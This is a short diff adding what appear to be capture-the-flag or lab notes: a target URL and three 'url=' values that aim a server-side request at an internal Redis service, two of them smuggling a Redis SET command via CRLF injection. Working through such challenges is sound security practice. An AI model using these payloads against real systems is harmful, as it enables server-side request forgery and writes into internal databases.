@@ -1,0 +1,6 @@
+https://140.112.90.54:10163/
+
+url=http://redis:6379/
+url=http://redis:6379/HTTP/1.1\r\nSET yy yyyy\r\nHeader2:\r\n
+url=http://redis:6379/?q=HTTP/1.1%0d%0aSET yy yyyy%0d%0aHeader2:%0d%0a
+	
